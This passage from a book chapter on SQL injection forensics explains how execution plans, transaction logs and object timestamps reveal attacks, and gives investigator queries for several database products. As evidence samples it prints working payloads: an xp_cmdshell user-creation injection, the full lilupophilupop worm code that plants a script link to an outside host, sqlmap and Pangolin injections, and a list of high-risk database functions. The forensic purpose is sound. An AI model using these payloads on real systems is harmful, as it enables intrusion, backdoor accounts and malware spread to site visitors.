computer. Searching web server \nlogs for IP addresses in receipt of large data transfers from the webserver can lead you to evidence of a successful SQL injection attack.  \nThe following query will return the number of kilobytes sent from a webserver to a client \ngroup ed by IP address:  \nlogparser “SELECT cs- uri-stem, Count(∗ ) as Hits, AVG(sc- bytes) AS Avg, Max(sc- bytes) AS Max, \nMin(sc-bytes) AS Min, Sum(sc- bytes) AS Total FROM \nC:\\inetpub\\logs\\LogFiles \\W3SVC1\\u_ex∗.log WHERE TO_LOWERCASE(cs- uri-stem) LIKE ‘%.asp%’ or \nTO_LOWERCASE(cs- uri-stem) LIKE ‘%.exe%’ GROUP BY cs- uri-stem ORDER BY cs -uri-stem” -rtp:-1 \n>> z:\\srv_to_client_transfer.txt  \nSample results are as follows:  \ncs-uri-stem Hits Avg Max Min Total  \n------------------------------  ---- ---- ---- ---- ------  \n… \n/EmployeeS earch.asp 2 -  - - - \nemployeesearch.aspx 2764 2113 3635 1350 16908  \n/employeesearch.aspx/ 193 3352 3734 1321 647008  \n/rzsqli/EmployeeSearch.aspx 1 - - - - \n… \nTo take the analysis a step further you can correlate IP’s in receipt of high byte counts with \nthose who supplied malicious queries within query name parameters.  \nAt this point you should have identified web pages and executable files within the \napplication  that were attacked, the timeframe of the attack and the IP addresses for the source. \nThis information will help you focus your analysis of other database artifacts to help confirm if \nattempted attacks were successful. The second artifact we will look at are database execution plans which are a valuable method of confirming or discounting a SQL injection attack.  \nDatabase Execution Plans  \nA database execution plan is a generated list of steps that show an RDBMS the most efficient way to access or modify infor mation. An example of this is if you were to look up directions to \na street address. There are multiple routes you could take to get to your destination such as using highways or city streets with one route being the quickest. Looking at that analogy within the database the data to be retrieved or updated would be the destination address and the most efficient route would be using  indexes (high- ways), city streets (manually scanning all \ndata pages looking for specific data) or a combination of both. \nA datab ase uses execution plans to ensure it is processing and satisfying queries in the most \nefficient manner possible. The first time a query is sent to a database server it will be parsed, analyzed to determine which tables would need to be accessed, which ind exes (if any) to use, \nhow to join or merge the results and so on. The outcome of this analysis is stored in a structure referred to as a database execution plan. These plans are shared between internal database components during execution and stored in an area of memory referred to as a plan cache with the hopes that it can be reused when another similar query is received.  \nIn addition to the most efficient way to satisfy a query, execution plans contain the syntax of \nthe actual query that forced its creatio n. This information is critical during an investigation as \nexecution plans can provide the exact syntax of previously executed SQL statements, including malicious queries stemming from a SQL injection attack. Some RDBMS products maintain several caches for  different types of SQL, but for simplicity we will focus on just the caches \nholding ad hoc queries and those stemming from SQL objects such as stored procedures, triggers, and extended procedures.  \nTools and traps  \nCaching can be beneficial for investigatin g potential SQL injection attacks however caching of sensitive \ninformation such as system passwords poses a security risk. The information you gather during an investigation \nmay contain passwords for administrator level database accounts which you will need to treat confidentially.  \nRecent version of Microsoft SQL Server and Oracle RDBMs platforms do have internal mechanisms that \nprevent exposing sensitive system passwords within execution plans, however older versions do not. For example \nprior to Microsoft SQL Server 2005, sensitive information such as passwords used in conjunction with the \nsp_password and OPENROWSET commands were often stored and exposed to other users within the execution \nplan cache.  \nMySQL and PostgreSQL do not contain protection for caching of sensitive information  and can log sensitive \ninformation within additional files such as the general and binary log files. All information gathered during your \ninvestigation should be treated as confidential.  \nAnalyzing a copy of executed queries may seem like a repeat of analyz ing web server log \nfiles however keep in mind that SQL injection queries you find in a web server log indicate an \nattack was attempted  and logged—not that it was successful . Controls such as protection \nwithin the code on the database server and down- stream  security devices such as host and \nnetwork IPS systems between the web server and database server may have detected and blocked the attack. Further there’s no guarantee the malicious code was successfully received and processed by the database server. Look ing at database execution plans eliminates this \nguesswork as observed malicious SQL injection queries indicate the attack was successfully tunneled through an application vulnerability through the network, then received and processed by the database server . Further it provides you the actual syntax that would  have been received \nby the database, including the code terminated by the attacker within his attack. This data is omitted within web server and firewall logs.  \nThe following is an example of a malicious  SQL injection query taken from a Microsoft \nSQL Server execution plan:  \nselect EmployeeID, Fname from ssfa.employee where fname= ‘Isaiah’; exec xp_cmdshell “net \nuser Isaiah Chuck!3s /add” -- and CompanyID = 1967’  \nYou’ll note that the execution plan contains  the original SQL query and the malicious \nstacked statement which escapes from the database into the Windows operating system and creates a new Windows user account. One powerful benefit of execution plan analysis is that the database server will actually cache the entire batch including the post -terminator logic that \nwas commented out to avoid processing by the RDBMS. The fact that seemingly valid logic is \ncommented out and an unrelated stacked query was executed is a good indicator of a successful SQL inj ection attack.  \nWhen investigating automated SQL injection worms execution plans take on an additional \nbenefit. When the worm is injected via a SQL injection vulnerability, it is common for the worm to search database tables for columns suitable to hold its  payload. When a suitable \ncolumn is found it updates the column with the malicious code. Behind the scenes, execution plans will be created in response to the initial worm infection as well as for each column updated by the worm as it persistently stores i t’s payload.  \nTo illustrate this point let us look at the lilupophilupop SQL injection worm which was \nreleased in November 2011. The initial infection was captured within the following execution plan taken from an infected Microsoft SQL Server:  \nset ansi_war nings off DECLARE @T VARCHAR(255),@C VARCHAR(255) DECLARE Table_Cursor CURSOR \nFOR select c.TABLE_NAME,c.COLUMN_NAME from INFORMATION_SCHEMA.columns c, \nINFORMATION_SCHEMA.tables t where c.DATA_TYPE in (‘nvarchar’,‘varchar’,‘ntext’,‘text’) and c.CHARACTER_MA XIMUM_LENGTH>30 and t.table_name=c.table_name and t.table_type=‘BASE TABLE’ \nOPEN Table_Cursor FETCH NEXT FROM Table_Cursor INTO @T,@C WHILE(@@FETCH_STATUS=0) BEGIN EXEC(‘UPDATE [’+@T+’] SET [’+@C+’]=’’”></title><script src=“http://lilupophilupop.com/sl.php”></script><!-- \n’’+RTRIM(CONVERT(VARCHAR(6000),[’+@C+’])) where \nLEFT(RTRIM(CONVERT(VARCHAR(6000),[’+@C+’])),17)<>’’”></title><script’’ ’) FETCH NEXT FROM Table_Cursor INTO @T,@C END CLOSE Table_Cursor DEALLOCATE Table_Cursor\n \nThe following snippet was taken from an execution plan on the infected server and shows \nthe worm persistently storing its payload by updating the LName column of the Customers \ntable with the malicious link to http://lilupophilupop.com: : \nUPDATE [ Employee4] SET [LName]=’”></title><script \nsrc=“http://lilupophilupop.com/sl.php”></script><!-- \n‘+RTRIM(CONVERT(VARCHAR(6000),[LName])) where \nLEFT(RTRIM(CONVERT(VARCHAR(6000),[LName])),17)<>’”></title><script’  \nThis information is critical when planning your  recovery from an attack as it tells you the \nexact actions performed by the worm. We’ll discuss this in more detail later in this chapter, for \nnow we’ll take a look at other activity you can look for that would indicate a successful SQL \ninjection attack.  \nWhat to Look for Within Cached Execution Plans  \nThroughout this book we have reviewed multiple techniques used to confirm and exploit SQL injection vulnerabilities. The examples and tools provided are current and mirror what attackers will use to exploit and  we will look at a few of the common signs of these attacks you \ncan observe within execution plans. However, for a detailed review of the different methods of SQL injection attacks you should refer to prior chapters of this book, paying close attention to Chapter 4 —Exploiting SQL injection and Chapter 5 —Blind SQL Injection Exploitation.  \nThe type of SQL injection exploitation and attack tool used, if applicable, will leave \ndifferent traces within execution plans and ultimately determine if you’re looking for a needle \nin a haystack or a needle in a pin cushion. A SQL injection attack using a stacked query can leave a single execution plan whereas a blind SQL injection using inference can generate hundreds of execution plans and will stand out like a sore thumb within the execution plan cache. As an example, the sqlmap tool —discussed earlier in this book—is configured to use \nblind SQL injection and inference. This tool will generate over  1300 execution plans such as \nthe following while just enumerating the banner of a Microsoft SQL Server:  \n<injection point> „ AND ASCII(SUBSTRING((ISNULL(CAST(@@VERSION AS VARCHAR(8000)), \nCHAR(32))), 171, 1)) > 99 AND ‘Lyatf’=‘Lyatf„ --’  \nSome additional gui dance on what to look for in execution plans are as follows:  \nRemnants of known malicious attack activity:  SQL injection tools and application \nvulnerability scanners leave behind unique footprints within a database server cache. This book serves as a good r esource of the popular SQL injection tools within the industry. You \nshould experiment with these tools and develop a cheat sheet of known attack patterns for your investigations. The following is an example of a SQL injection attack launched by the Pangoli n attack tool, which exploited a SQL injection vulnerability, escaped from the database, \nand began enumerating the operating system file directory structure:  \nselect EmployeeID, FName, LName, YOB from SSFA.Employee where [fname]= ‘Mikaela’; declare @z \nnvarchar(4000) set @z=0x43003a005c005c0069006e0065007400700075006200 insert \npangolin_test_table execute master..xp_dirtree @z,1,1-- ’ \nIn the preceding execution plan if the use of the table name pangolin_test_table  wasn’t a \nsure indicator of a successful SQL inj ection attack via the Pangolin exploitation tool, the \nsyntax and structure of the execution plan contents match the pattern left by Pangolin.  \nAlso of interest is that Pangolin uses hex encoding in an effort to obfuscate its attack \npayloads. Converting the hex to character makes the payload human readable and in this \nexample provides the specific directory folder the attacker viewed via the xp_dirtree extended procedure. The following is an example of how to perform this conversion using the native convert c ommand of a SQL Server 2008 server:  \nselect convert (nvarchar (max), 0x43003a005c005c0069006e0065007400700075006200)  \nWhen executed the C: \\\\inetpub  value is returned, which is the specific directory enumerated \nby the attacker.  \nTools and traps  \nNote that attackers may use hex encoding in an effort to avoid detection. The hex encoded attack syntax will be \nentered into the attacker’s web browser and travel encoded over the network to the web server, through to the \ndatabase server, and it will actually be cached in its encoded format within the execution plan. You’ll need to \nensure when searching the plan cache for key strings that you search for both ASCII characters as well as other \nformats such as hex. For a list of obfuscation formats to keep in mind see the Evading Input Filters section within \nChapter 7  of this book.  \nStacked queries in conjunction with comments:  Stacked queries are used for both \nlegitimate as well as malicious purposes. Several SQL batches within procedures shipped by the RDBMS vendor and by legitimate database administrators utilize them, therefore the mere existence of a stacked query is not a g ood indication of a successful attack. As we discussed in \nChapter 4 , insecure handling of user input when building SQL queries in most development \nlanguages and database platforms is extremely dangerous as this allows manipulation of the SQL syntax executed and will allow an attacker to simply stack a new statement on to the existing one where the platform allows. By doing so the attacker will also generally need to comment out the preceding logic the developer intended the application to execute, so looking \nthrough execution plans for entries containing stacked queries in addition to terminated logic is a far better indicator of a successful SQL injection attack, as witnessed in the following revisited example from earl ier in this chapter: \nselect EmployeeID, Fname from ssfa.employee where fname= ‘Lory’; exec xp_cmdshell “net user \nIsaiah Chuck!3s /add” -- and ID = 1967’  \nIllogical usage of conditional statements:  We looked at the usage of conditional operators \nsuch as wher e 1=1 or a=a in Chapter 4 . The following is an execution plan containing a \nconditional operator that would indicate a successful attack:  \nSelect fname, lname, date_of_birth, corp_credit_card_num from employee where empl oyeeID = \n1969 or 1 = 1  \nAs you can see within the preceding execution plan there is no logical purpose for the \ncomparison operation 1=1 other than to negate the restriction the programmer intended to \nenforce via the where expression.  \nHigh risk statements an d database functions:  Functionality within RDBMS systems was \ndeveloped by the vendor with the hopes they would simplify many tasks for normal users. Over the years hackers have found ways to leverage them to craft their exploits. Evidence of the usage of s ome of these features can serve as a good indication of a successful attack \ndepending on their context of use. Many of these features have been covered in the previous chapters of this book however Table 10.3 is a bri ef summary of high risk functions that are \ncommonly associated with SQL injection attacks.  \nTable 10.3  High Risk Statements and Functions  \nDatabase  Functio n \nMicrosoft SQL Server  XP_CMDSHELL  \n XP_reg∗ \n SP_OACREATE  \n sp_OAMethod  \nDatabase  Functio n \n OPENROWSET  \n sp_configure  \n BULK INSERT  \n BCP \n WAITFOR DELAY  \nOracle  UTL_FILE  \n UTL_HTTP  \n HTTPURITYPE  \n UTL_INADDR  \nMySQL  LOAD DATA INFILE, LOAD_FILE  \n BENCHMARK  \n ENCODE()  \n OUTFILE()  \n CONCAT()  \nDatabase  Functio n \nPostgreSQL  pg_ls_dir  \n pg_read_file  \n pg_read_binary_file  \n pg_stat_file  \n pg_sleep  \nIt should be noted though that you may find statements utilizing the functions within Table \n10.3. In many cases you’ll be able to look at the database statements and  determine if they are \nindeed evidence of a past attack. In some cases you will need to flag suspicious activity and \npresent it to the company’s DBA or application developer to determine if the usage is part of expected application functionality.  \nNow that you know what to look for within execution plans let us move on to the methods \nyou can use to access execution plans on some popular RDBMS’s.  \nHow to Access Execution Plans  \nMicrosoft SQL Server and Oracle have different system functions and procedures that allow interaction with execution plans. MySQL and PostgreSQL do not allow direct access to stored execution plans. Table 10.4 lists d atabase views that can be used to gather cached execution \nplans. \nTable 10.4  RDBMS Database Views Providing Access to Stored Execution Plans  \n \nThe following are some examples of how to use the views captured in Table 10.4 to access \ncached execution plans.  \nMicrosoft SQL Server  \nThe two views that can be used to access the execu tion plan cache are \nsys.dm_exec_query_stats, which provides execution information, and sys.dm_exec_sql_text, \nwhich provides the actual syntax that was executed. The following query uses the  views to \nreturn the date and time the plan cache entry was created , the last time it was executed (in the \ncase of repeat execution), the syntax executed as well as the number of times the execution plan was reused (see Figure 10.1):  \nselect creation_time, last_execution_time, text, execution_count from \nsys.dm_exec_query_stats qs CROSS APPLY sys.dm_exec_sql_text(qs.sql_handle)  \n \nFigure 10.1  Sample Query Results Containing Microsoft SQL Server Execution Plans  \nOracle  \nOn Oracle the gv$sql view can be used to return exe cution plans. Please note that gv$sql is a \nglobal view that gathers execution plans from both server caches when run on an Oracle cluster, but can still be executed to gather the full cache of a standalone Oracle installation. Due to this, the global view is a better choice than the v$sql view which will provide limited \n\nresults when run on an Oracle cluster. The following is an example of how to use the gv$sql \nview:  \nselect sql_text from gv$sql;  \nSample results are as follows:  \n… \nselect inst_id,kmmsinam,kmmsip rp,kmmsista,kmmsinmg, kmm…  \nUPDATE MGMT_TARGETS SET LAST_LOAD_TIME=:B2 WHERE TARGET…  \nUPDATE MGMT_TARGETS SET LAST_LOAD_TIME=:B2 WHERE TARGET…  \nUPDATE MGMT_TARGETS SET LAST_LOAD_TIME=:B2 WHERE TARGET…  \nUPDATE MGMT_TARGETS SET LAST_LOAD_TIME=:B2 WHERE TARGET…  \nUPDATE MGMT_TARGETS SET LAST_LOAD_TIME=:B2 WHERE TARGET…  \nUPDATE MGMT_TARGETS SET LAST_LOAD_TIME=:B2 WHERE TARGET…  \nSELECT ROWID FROM EMDW_TRACE_DATA WHERE LOG_TIMESTAMP <…  \nselect /∗ + no_parallel_index(t, “ WRM$_SCH_VOTES_PK” ) … \nselect /∗ + no_parallel_index(t, “ WRM$_SCH_VOTES_PK” ) … \n… \nMySQL \nMySQL generates and stores execution plans, however there are no vendor -issued functions \ndeveloped to access the actual queries stored within. MySQL, however, does maintain a general query log that records executed queries in human readable format. This general query log is not enabled by default, however during an investigation you can determine its status using the “show variables” command as follows from your database client:  \nshow variables like ‘%general_log%’  \nThe following sample results show the general log is enabled and writing to the C:\\GQLog\\rz-\nmysql.log’  directory on the server:  \nVariable_name | Value  \n------------------------ |----------------  \ngeneral_log | ON  \ngeneral_log_file | C:\\ GQLog\\rz-mysql.log  \nThe following is a snippet from the log that shows a logged SQL injection statement:  \n… \n120116 22:33:16 4 Query CREATE DATABASE Ring0_db  \n4 Query SHOW WARNINGS  \n1 Query show global status  \n120116 22:33:20 1 Query show global status  \n120116 22:33:2 4 1 Query show global status  \n4 Query SHOW VARIABLES LIKE ‘%HOME%’  \n120116 22:33:27 1 Query show global status  \n120116 22:33:30 4 Query select ∗  from mysql.user  \nLIMIT 0, 1000  \n120116 22:33:31 1 Query show global status  \n120116 22:33:33 4 Query select ∗  from information_schema.routines  \nLIMIT 0, 1000  \n120116 22:33:34 1 Query show global status  \n120116 22:33:36 4 Query select ∗  from information_schema.PROCESSLIST  \nLIMIT 0, 1000  \n120116 22:33:38 1 Query show global status  \n120116 22:33:39 4 Query select ∗  from information_schema.tables  \n… \nPostgreSQL  \nSimilar to MySQL, there is not a native way of viewing the stored execution plans of \npreviously executed queries on PostgreSQL. However, when the log_statement is enabled it will store a record of executed SQL queries. The following query can be used to determine if \nthe log_statement value is enabled on a server and if so where the log is located:  \nselect name, setting from pg_settings where name IN (‘log_statement’, ‘log_directory’ , \n‘log_filename’)  \nWithin the sample results you can see the logs are stored within the default pg_log directory \nwithin the PostgreSQL directory structure, and are using the default naming convention:  \nName | Setting  \n-------------- |----------------------------------  \nLog_directory | pg_log  \nLog_filename | postgresql- %Y-%m-%d%H%M%S.log  \nLog_statement | mod  \nThere are four possible values for log_statement —none, ddl, mod, and all. A setting of mod \nor higher is required to log enough query information to be truly be neficial in an investigation. \nViewing the log within a text editor or MS Excel will allow you to review a listing of previously executed queries as seen within the following sample results:  \n2012-01-16 23:14:40 EST STATEMENT: select ∗ from pg_trigger  \n… \nselect ∗ from pg_tables  \nselect ∗ from pg_user  \nselect ∗ from pg_database  \nselect pg_read_file(‘pg_log\\ postgresql -2012-01-14_103156.log’, 0, 200000);  \n… \nAs beneficial as execution plans are during an investigation there are limitations that are \nimportant to also u nderstand. \nExecution Plan Limitations  \nAlthough they are indispensable, database execution plans have associated limitations that \naffect their usefulness within an investigation. Aside from being disabled by default in PostgreSQL and MySQL, they can be disa bled by an attacker with sufficient permissions. \nMicrosoft SQL Server and Oracle prevent the disabling of execution plans, however plans are subject to local RDBMS eviction policies and can be flushed using special RDBMS functions. \nCache eviction policies  control the size of execution plan cache stores. Policies purge cache \nentries in response to multiple factors the most notable being:  \n• CPU and memory load on the database server.  \n• The frequency of plan reuse.  \n• Modification of an object referenced within a cached execution plan.  \n• Restart of the database services.  \nDespite defined eviction policies some RDBMS’s will actually retain plans left by SQL \ninjection attacks for an extended period of time. One example of this is Microsoft SQL Server, which will ca tegorize queries using statements such as WAITFOR, IN, UNION and \ncomparison operators like 1=1 as complex. Complex statements require additional processing for Microsoft SQL Server to create associated execution plans and retain them longer to avoid \nhaving to recreate these complex execution plans. Oracle, MySQL and PostgreSQL however \ndo not favor caching of complex execution plans. \nFor a complete list of factors affecting cached execution plans you should consult vendor \ndocumentation and ensure you are fam iliar with them as you prepare for an investigation.  \nManual cache flushes  can be used by a user with administrator privileges to flush database \nexecution plan caches. Within Microsoft SQL Server specific execution plan caches and even \nspecific entries can be flushed, whereas in Oracle it is a little less granular only allowing the flush of the cache in its entirety. You should refer to vendor documentation for the specific database functions that can flush the execution plan cache.  \nA final limitation we will look at is parameterization. In Chapter 8 , we looked at using \nparameterized queries to help prevent SQL injection vulnerabilities. Within the RDBMS parameterization takes on another context and is the process used to replace literal values \nwithin an execution plan with variables. This process is performed to increase the likelihood of the RDMBS reusing the cached pan to satisfy future queries. An example of this is the following query:  \nselect EmployeeID, FName, LName, YOB from SSFA.Employee where [fname]= ‘mike’  \nDatabase servers can cache the preceding statement as you see it in its raw format, or may \nparameterize it which would force the caching of the following in replacement of the originally executed query:  \n(@1 var char(8000))SELECT [EmployeeID],[FName],[LName],[YOB] FROM [SSFA].[Employee] WHERE \n[fname]=@1  \nParameterization complicates an investigation due to the fact that the RDBMS can replace \nthe SQL injection attack payload with a variable within the execution plan . There is no \npublicly released method to translate the variable back to the raw literal values which lessens the benefit of parameterized execution plans during an investigation. In these cases knowing that activity occurred within a database object at a given date/time will support development of an investigation timeline of events.  \nThe plan cache will outline the statements executed on a server, however will not provide \nyou the user context used to execute it. Analyzing the plan cache in conjunction with the \ntransaction log can point you in the right direction. \nTransaction Log  \nThe SQL language consists of several sub- elements such as clauses, queries, and statements. \nTo dig a little deeper (but not too deep) a statement includes one or more database opera tions. \nThe two main categories of operations are Data Manipulation Language (DML), which affects \ndata within a table, and Data Definition Language (DDL) operations that affect the structure of \ndatabase such as creating a new table.  \nA transaction log is use d to record the fact that a transaction is set to occur as well as the \ninformation needed by the database server to recover the data back to a consistent state in event of a sever failure while it is writing information to disk.  \nChanges to the actual datab ase data pages don’t happen in real -time. At predefined intervals \ninformation from the transaction log is later applied to disk in coordinated data writes that are better for overall performance. This may sound convoluted, however the write to the transact ion log is much quicker than the RDBMS seeking and writing information to the \nappropriate areas in large database files.  \nThere are several unique database operations that can be logged within a transaction log \nhowever under the hood of a database almost al l operations, regardless if they are classified as \nDML or DDL, all boil down to INSERT, UPDATE, and DELETE operations which are used when information needs to be written, updated, or deleted from disk.  \nSQL injection attacks almost always leave traces within the database transaction log, \nwhether the attack included the direct modification of information within a table or not. Even in the case when an attacker executes a SELECT statement, the associated WHERE expression \nmay force the RDBMS to create a temporary table to sort interim results before returning them back to the attacker. This would result in the creation of several transaction log entires associated with the creation of the temporary table and loading of the interim SELECT results.  \nWhat to Look For  \nTransaction log analysis is a very detailed topic that would extend beyond the scope of this book. Therefore we will focus on a few key transactions that will support your investigation. In summary, transaction logs should be reviewed for the following:  \n1. INSERT, UPDATE, and DELETE statements executed within the timeframe of a suspected \nattack. This information can be used to identify activity performed during the timeline of an investigation as well as allow the correlation of events with other artifacts.  \n2. Non-standard database operations performed by a database user (where applicable). An \nexample of this would be an application user account that routinely reads information from the database and abruptly begins executing INSERT, UPDATE and DELETE opera tions.  \nWe will now step through how to search the transaction logs of popular RDBMS and look at \nsome malicious uses of statements and functions captured in Table 10.3.  \nMicrosoft SQL Server  \nThe Microsoft SQL Server transaction log is enabled by default and cannot be disabled. The \nnative fn_dblog function can be used from any SQL Server client to access it. Two native clients that ship with the retail version of MS SQL Server are SQLCMD a command line client and the traditional SQL Server Management Studio GUI.  \nThe following is a query that is helpful and shows a summary of transactions executed \nagainst user tables:  \nSELECT AllocUnitName as ‘Object’, Operation, COUNT(OPERATION) AS ‘Count’ from \nfn_dblog(null,null) WHERE OPERATION IN (‘LOP_INSERT_ROWS’, ‘LOP_MODIFY_ROW’, \n‘LOP_DELETE_ROWS’) and AllocUnitName NOT Like ‘sys.%’ GROUP BY Operation, AllocUnitName \nORDER BY Object, Operation  \nSample results are shown in Figure 10.2.  \n \nFigure 10.2  Sample Quer y Results Containing Microsoft SQL Server Transaction Log Summary  \nThe Unkown Alloc Unit entries within the results signify that the object referenced by the \ntransactions has since been deleted. The high count of LOP_MODIFY_ROW and \nLOP_INSERT_ROWS tells us that 460 rows of information were inserted into a table, updated 330 times. If this is contrary to expected application activity, this would be suspect and may be the indicator of SQL injection attack related activity and should be flagged for further anal ysis \nto reconstruct the actual data inserted, modified, and deleted.  \nA second query that is useful is database scoped and will return a listing of all INSERT, \nUPDATE, and DELETE operations in addition to a few additional operations often associated with SQ L injection attacks as captured within the query:  \n\nSELECT tlg.Spid, tlg.[Transaction ID], CASE WHEN (select name from sys.server_principals lgn \nwhere RTRIM(lgn.SID) = RTRIM(tlg.[Transaction SID])) IS NULL AND (select distinct name \nfrom sys.database_principals lgn where RTRIM(lgn.SID) = RTRIM(tlg.[Transaction SID])) IS NULL THEN ‘[Unknown SID]: ’ + convert (varchar(max), [Transaction SID]) ELSE CASE WHEN (select name from sys.server_principals lgn where RTRIM(lgn.SID) = RTRIM(tlg.[Transaction SID])) IS NOT NULL THEN ‘login: ’ + upper((select name from sys.server_principals lgn where RTRIM(lgn.SID) = RTRIM(tlg.[Transaction SID]))) ELSE ‘db user: ’ + upper((select name from sys.database_principals lgn where RTRIM(lgn.SID) = RTRIM(tlg.[Transaction SID]))) END END as ‘Login_or_User’, tlg.[Transaction Name] as ‘Transaction Type’, \ntlg.[Begin Time] from fn_dblog(null, null) tlg where CAST ([Begin Time] AS DATETIME) >= ‘2011-01-01’ AND CAST ([Begin Time] AS DATETIME) <=‘2012- 07-29’ AND [transaction name] IN \n(‘INSERT EXEC’, ‘DROP OBJ’, ‘CREATE TABLE’, ‘INSERT’, ‘UPDATE’, ‘DELETE’, ‘DROP USER’, ‘ALTER TABLE’, ‘ALTER USER’, ‘USER TRANSACTION’, ‘BULK INSERT’, ‘CreatProc transaction’)ORDER BY [Begin Time] DESC, [TransAction ID], USER, [Transaction Type]\n \nSample results are sh own in Figure 10.3.  \n \nFigure 10.3  Sample Query Results Containing Mic rosoft SQL Server Transaction Log Summary  \nAs you can see by the preceding results there are multiple columns of information. An \nexplanation of each data entity is as follows:  \n\nSPID:  The unique session identifier assigned to the connection who executed the l ogged \ntransaction.  \nTransaction ID:  A unique identifier used by the RDBMS to group multiple related operations \ntogether.  \nLogin_or_User:  The database server login or database user account that executed the \ntransaction.  \nTransaction Type:  A description of the type of transaction executed.  \nBegin Time:  The time the transaction was executed.  \nThe preceding query will allow you to see database operations by database user account. \nWithin the results you can see several tables are created and the EXEC command is used to \nINSERT data into a table. This should be treated as highly suspect, especially noting that the activity was performed by what looks like an application account. This activity should be taken to a database administrator to confirm its legitimacy.  \nOracle  \nOn Oracle the transaction (archive) log is enabled by default and can’t be disabled on test systems. The following query can be used within Oracle to return a list of executed INSERT, UPDATE, and DELETE operations:  \nSELECT OPERATION, SQL_REDO, SQL_UNDO FROM V$LOGMNR_CONTENTS WHERE SEG_OWNER = ‘WEBAPP’ AND \nSEG_NAME = ‘SYNGRESS’ AND (timestamp > sysdate - 1) and (timestamp < sysdate) AND OPERATION \nIN (‘DELETE’, ‘INSERT’, ‘UPDATE’) AND USERNAME = ‘KEVVIE’;  \nSample results are as follows:  \n… \nDELETE from “WEBAPP”.“SYNGRESS” where “A” = ‘80’ and “B” = ‘three’ and “C” = TO_DATE(‘23-\nJAN-12’, ‘DD- MON-RR’) and ROWID = ‘AAATcPAAEAAAAIuAAD’;  \nINSERT INTO “WEBAPP”.“SYNGRESS”(“A”,“B”,“C”) values (‘80’,‘three’,TO_DATE(‘23- JAN-12’, ‘DD-\nMON-RR’));  \n… \nMySQL \nThe transaction log in MySQL is not enabled by default and must be enabled in order to log \ntransactions. To determine if the transaction log is active you can use the “show binary logs” \nstatement: \nSHOW BINARY LOGS;  \nIf binary logging is disabled you will rec eive an error stating “you are not using binary \nlogging”. If it is enabled the name of all logs will be returned as seen in the following:  \nLog_name | File_size  \n-----------------------------------  \nDB_Bin_Logs.000001 | 1381  \nDB_Bin_Logs.000002 | 4603  \nDB_Bin_Logs.000003 | 126  \nDB_Bin_Logs.000004 | 794  \nDB_Bin_Logs.000005 | 126  \nDB_Bin_Logs.000006 | 221  \nDB_Bin_Logs.000007 | 107  \nWhen logging is configured the first MySQL transaction logs will have the extension \n∗.000001 and increment each time the server restarts, t he log reaches a predetermined size, or \nis flushed. To determine where the logs are stored you can use the following query:  \nSHOW VARIABLES LIKE ‘%HOME%’  \nThe innodb_log_group_home_dir value within the results is the location of the log files. \nWithin the fol lowing sample results the logs are stored within the MySQL root directory (. \\): \nVariable_name | Value  \n---------------------------| ----------------  \ninnodb_data_home_dir |  \ninnodb_log_group_home_dir | .\\  \nTo dump a list of transactions from the transaction log  you can use the native MySQL \nmysqlbinlog utility on non- Windows servers, and the MySQL command line client for \nWindows.  \nThe following query example shows how to return a list of all transactions recorded within \nthe DB_BIN_Log.000002 file:  \nmysqlbinlog “c:\\ Program Files\\ MySQL\\DB_Bin_Logs.000002” > z:\\ transactionlog.txt  \nSample results are as follows which show the previously executed statements recorded in \nthe logfile in human readable form:  \nBEGIN  \n/∗!∗/; \n# at 4155  \n#120114 0:30:34 server id 1 end_log_pos 4272 Query thread_id=16 exec_time=0 error_code=0  \nuse world/ ∗!∗/; \nSET TIMESTAMP=1326519034/∗ !∗/; \nupdate city set name = ‘Ashburn’ where name = ‘Kabul’  \n/∗!∗/; \n# at 4272  \n#120114 0:30:34 server id 1 end_log_pos 4342 Query thread_id=16 exec_time=0 er ror_code=0  \nSET TIMESTAMP=1326519034/∗ !∗/; \nCOMMIT  \n/∗!∗/; \n# at 4342  \n#120114 0:30:52 server id 1 end_log_pos 4411 Query thread_id=16 exec_time=0 error_code=0  \nSET TIMESTAMP=1326519052/∗ !∗/; \nBEGIN  \n/∗!∗/; \n# at 4411  \n#120114 0:30:52 server id 1 end_log_pos 4514 Query thread_id=16 exec_time=0 error_code=0  \nSET TIMESTAMP=1326519052/∗ !∗/; \ndelete from city where name = ‘Ashburn’  \n/∗!∗/; \n# at 4514  \n#120114 0:30:52 server id 1 end_log_pos 4584 Query thread_id=16 exec_time=0 error_code=0  \nSET TIMESTAMP=1326519052/∗ !∗/; \nCOMMIT  \n/∗!∗/; \nDELIMITER;  \n# End of log file  \nROLLBACK / ∗ added by mysqlbinlog ∗ /; \n/∗!50003 SET COMPLETION_TYPE=@OLD_COMPLETION_TYPE∗ /; \nPostgreSQL  \nThe PostgreSQL command line client can be used to return transaction log information. In \nPostgreSQL the transaction log is not enabled by default and when enabled it can be disabled. \nFurther in recent versions of PostgreSQL there are UNLOGGED tables which do not write \nassociated INSERT, UDPATE, AND DELETE operations to the transaction log regardless of whether the log is enabled or disabled. Due to these limitations it is better during an investigation to leverage the PostgreSQL statement log to identify tr ansactions of interest \nincluding those from UNLOGGED tables. For guidance on how to access the statement log you can refer to the PostgreSQL example within the Execution Plan section of this chapter.  \nAs great as transaction logs are during an investigation  they as well do have their \nlimitations. They are highly configurable which ultimately determines how much information is logged within them and the lifespan of the information before it is overwritten. Transaction log information can last anywhere from mi nutes to months to indefinitely. Transaction log \nretention and logging does have material differences between RDBMS platforms and it is recommended you consult vendor documentation to obtain additional information about them. \nDatabase Object Time Stamps  \nRecent databases mimic operating systems, from dedicated memory management to running \ntheir own virtual operating system to manage memory and processes. Also similar to operating \nsystems most RDBMS products also maintain timestamp information on objects and files created and modified within its structure. \nDuring an investigation, generating a listing of key objects and associated timestamps is a \ngood way to for you to identify object creation and modification activity during the timeframe of a suspected attack. When investigating a suspected SQL injection attack pay close attention to the following activity commonly associated with an attack:  \n• User account creation  which is often used to create backdoor access. \n• Addition of privileges  to existing accounts commonly performed as part of privilege \nelevation.  \n• Creation of tables  which are often used to store interim results before they are returned to an \nattacker.  \nThe following is an example of queries that can be run to return timestamp information from \nMicroso ft SQL Server, Oracle, MySQL, and PostgreSQL.  \nSQL Server  \nThe following query will return a listing of views, procedures, functions, tables, and extended \nprocedures within in the current database ordered by modification and creation date both in descending order:  \n(select sob.name as ‘object’, sch.name as ‘schema’, type_desc, create_date, modify_date from \nsys.all_objects sob, sys.schemas sch WHERE sob.schema_id = sch.schema_id and sob.type IN \n(‘V’,‘P’, ‘FN’, ‘U’,‘S’, ‘IT’,‘X’))  \nUNION  \n(select name, ’’, ‘Db_User’, createdate, updatedate from sys.sysusers)  \nUNION  \n(select name, ’’, ‘Login’, createdate, updatedate from sys.syslogins)  \nIn the following sample results the table name !nv!s!ble should be treated as suspect due to \nthe unusual table name, especially if 